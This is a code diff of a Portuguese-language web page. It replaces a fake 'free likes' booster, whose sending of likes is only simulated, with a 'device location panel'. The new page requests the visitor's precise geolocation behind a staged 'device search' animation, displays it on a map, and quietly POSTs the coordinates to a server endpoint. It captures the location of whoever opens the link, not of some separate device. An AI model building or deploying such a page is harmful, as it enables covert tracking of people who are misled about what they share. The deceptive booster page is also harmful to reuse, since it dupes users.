@@ -3,152 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sérgio Curtidas - Boost Grátis TikTok, Instagram e Facebook</title>
+    <title>Painel de Localização do Dispositivo</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
     <style>
-        body { 
-            background-color: #0f0f13; 
-            color: #ffffff; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
-            padding-top: 60px; 
-            margin: 0;
-        }
-        .container { 
-            background: #17171f; 
-            padding: 40px 30px; 
-            border-radius: 15px; 
-            display: inline-block; 
-            width: 90%; 
-            max-width: 460px; 
-            box-shadow: 0px 8px 25px rgba(0,0,0,0.7); 
-            border: 1px solid #232330;
-        }
-        h1 {
-            color: #25d366;
-            margin-bottom: 5px;
-            font-size: 28px;
-            letter-spacing: 1px;
-        }
-        p {
-            color: #a0a0b0;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        input, select, button { 
-            width: 100%; 
-            padding: 14px; 
-            margin: 12px 0; 
-            border-radius: 8px; 
-            border: 1px solid #2d2d3f; 
-            font-size: 16px; 
-            box-sizing: border-box; 
-            outline: none;
-            transition: 0.3s;
-        }
-        input { 
-            background: #1e1e2a; 
-            color: white; 
-        }
-        input:focus {
-            border-color: #25d366;
-        }
-        select { 
-            background: #1e1e2a; 
-            color: white; 
-            cursor: pointer;
-        }
-        button { 
-            background: #25d366; 
-            color: #000000; 
-            font-weight: bold; 
-            cursor: pointer; 
-            border: none;
-            margin-top: 15px;
-        }
-        button:hover { 
-            background: #1ebd54; 
-            transform: scale(1.02);
-        }
-        .timer { 
-            color: #ff4757; 
-            font-weight: bold; 
-            margin-top: 15px; 
-            padding: 10px;
-            background: rgba(255, 71, 87, 0.1);
-            border-radius: 6px;
-            display: none; 
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #555565;
-        }
+        * { box-sizing: border-box; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f4f4f4; color: #333; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); padding: 20px; }
+        .header { display: flex; justify-content: space-between; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; font-size: 14px; color: #666; }
+        .progress-section { background: #fafafa; border: 1px solid #eee; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
+        .progress-bar-container { background: #e0e0e0; height: 15px; border-radius: 10px; margin-top: 10px; overflow: hidden; position: relative; }
+        .progress-bar { background: #8cd867; height: 100%; width: 0%; transition: width 0.2s ease; }
+        .progress-text { position: absolute; right: 10px; top: -2px; font-size: 12px; font-weight: bold; }
+        .content-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 768px) { .content-grid { grid-template-columns: 1fr; } }
+        .data-panel, .map-panel { border: 1px solid #ddd; border-radius: 6px; padding: 15px; min-height: 350px; }
+        .data-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed #eee; font-size: 14px; }
+        .data-item span:first-child { color: #555; font-weight: bold; }
+        .blur { filter: blur(8px); pointer-events: none; opacity: 0.4; transition: filter 1s ease, opacity 1s ease; }
+        #map { width: 100%; height: 100%; min-height: 320px; border-radius: 4px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🚀 Sérgio Curtidas</h1>
-    <p>O maior impulsionador gratuito para suas redes sociais.</p>
-    
-    <form id="boostForm">
-        <label style="text-align: left; display: block; font-size: 12px; color: #888;" for="redeSocial">Escolha a Rede:</label>
-        <select id="redeSocial">
-            <option value="tiktok">TikTok (Curtidas)</option>
-            <option value="instagram">Instagram (Curtidas)</option>
-            <option value="facebook">Facebook (Reações)</option>
-        </select>
-        
-        <label style="text-align: left; display: block; font-size: 12px; color: #888;" for="postLink">Link da Publicação:</label>
-        <input type="url" id="postLink" placeholder="Cole o URL aqui..." required>
-        
-        <button type="submit" id="btnEnviar">ENVIAR CURTIDAS GRÁTIS</button>
-    </form>
-    
-    <div id="countdown" class="timer">
-        Sérgio Curtidas Proteção: Aguarde <span id="seconds">300</span> segundos para enviar novamente.
+    <div class="header">
+        <div><strong>Dispositivo Conectado</strong></div>
+        <div><strong>Data:</strong> <span id="current-date"></span></div>
     </div>
 
-    <div class="footer">
-        © 2026 Sérgio Curtidas. Todos os direitos reservados.
+    <div class="progress-section">
+        <label><strong>Pesquisa pelo dispositivo</strong></label>
+        <div id="status-status" style="font-size: 12px; color: #777;">Aguardando permissão de hardware do dispositivo...</div>
+        <div class="progress-bar-container">
+            <div class="progress-bar" id="bar"></div>
+            <div class="progress-text" id="percent">0%</div>
+        </div>
+    </div>
+
+    <div class="content-grid">
+        <div class="data-panel">
+            <h3 style="margin-bottom: 15px; color: #006699;">Dados obtidos</h3>
+            <div id="data-body" class="blur">
+                <div class="data-item"><span>Latitude:</span> <span id="lat-val">-</span></div>
+                <div class="data-item"><span>Longitude:</span> <span id="lon-val">-</span></div>
+                <div class="data-item"><span>Margem de Erro:</span> <span id="acc-val">-</span></div>
+                <div class="data-item"><span>Plataforma:</span> <span id="plat-val">-</span></div>
+                <div class="data-item"><span>Agente:</span> <span id="agent-val">-</span></div>
+            </div>
+        </div>
+
+        <div class="map-panel">
+            <div id="map" class="blur"></div>
+        </div>
     </div>
 </div>
 
 <script>
-    document.getElementById('boostForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+    document.addEventListener("DOMContentLoaded", () => {
+        // Exibe a data atual
+        document.getElementById("current-date").innerText = new Date().toLocaleDateString('pt-BR');
         
-        const btn = document.getElementById('btnEnviar');
-        const timerDiv = document.getElementById('countdown');
-        const secondsSpan = document.getElementById('seconds');
-        
-        btn.disabled = true;
-        btn.innerText = "ENVIANDO...";
-        btn.style.background = "#555";
-        
-        // Simulação do envio (integração com o backend)
-        setTimeout(() => {
-            alert('Pedido processado com sucesso no sistema Sérgio Curtidas!');
-            
-            // Inicia o Cooldown de 5 minutos (300 segundos) igual ao Zefoy
-            let timeLeft = 300;
-            timerDiv.style.display = 'block';
-            
-            const interval = setInterval(() => {
-                timeLeft--;
-                secondsSpan.innerText = timeLeft;
-                if(timeLeft <= 0) {
-                    clearInterval(interval);
-                    timerDiv.style.display = 'none';
-                    btn.disabled = false;
-                    btn.innerText = "ENVIAR CURTIDAS GRÁTIS";
-                    btn.style.background = "#25d366";
+        const progressBar = document.getElementById("bar");
+        const percentText = document.getElementById("percent");
+        const statusText = document.getElementById("status-status");
+        const dataBody = document.getElementById("data-body");
+        const mapEl = document.getElementById("map");
+
+        // Solicita a geolocalização nativa do dispositivo
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    statusText.innerText = "Dispositivo localizado! Sincronizando dados com o painel...";
+                    animarPainel(position.coords);
+                },
+                (error) => {
+                    statusText.innerText = "Erro: Permissão de localização negada pelo usuário.";
+                    alert("Para o programa funcionar, é necessário permitir o acesso à localização.");
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            statusText.innerText = "Geolocalização não suportada neste navegador.";
+        }
+
+        function animarPainel(coords) {
+            let progresso = 0;
+            const intervalo = setInterval(() => {
+                progresso += Math.floor(Math.random() * 8) + 2;
+                
+                if (progresso >= 100) {
+                    progresso = 100;
+                    clearInterval(intervalo);
+                    
+                    // Alimenta a tabela de informações na tela
+                    document.getElementById("lat-val").innerText = coords.latitude.toFixed(6);
+                    document.getElementById("lon-val").innerText = coords.longitude.toFixed(6);
+                    document.getElementById("acc-val").innerText = Math.round(coords.accuracy) + " metros";
+                    document.getElementById("plat-val").innerText = navigator.platform;
+                    document.getElementById("agent-val").innerText = navigator.userAgent.split(" ")[0];
+
+                    // Remove o efeito borrado
+                    dataBody.classList.remove("blur");
+                    mapEl.classList.remove("blur");
+                    statusText.innerText = "Varredura concluída com sucesso.";
+
+                    // Inicializa e renderiza o mapa real na coordenada obtida
+                    const map = L.map('map').setView([coords.latitude, coords.longitude], 15);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        attribution: '© OpenStreetMap'
+                    }).addTo(map);
+                    L.marker([coords.latitude, coords.longitude]).addTo(map)
+                        .bindPopup('O dispositivo está aqui.')
+                        .openPopup();
+
+                    // Envia os dados coletados de volta para o Back-end (servidor) salvar ou registrar
+                    enviarDadosAoServidor(coords);
                 }
-            }, 1000);
-            
-        }, 2000);
+
+                progressBar.style.width = progresso + "%";
+                percentText.innerText = progresso + "%";
+            }, 100);
+        }
+
+        function enviarDadosAoServidor(coords) {
+            fetch('/api/localizacao', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: coords.latitude,
+                    longitude: coords.longitude,
+                    precisao: coords.accuracy
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log("Resposta do Servidor:", data))
+            .catch(err => console.error("Erro ao enviar dados ao servidor:", err));
+        }
     });
 </script>
-
 </body>
 </html>
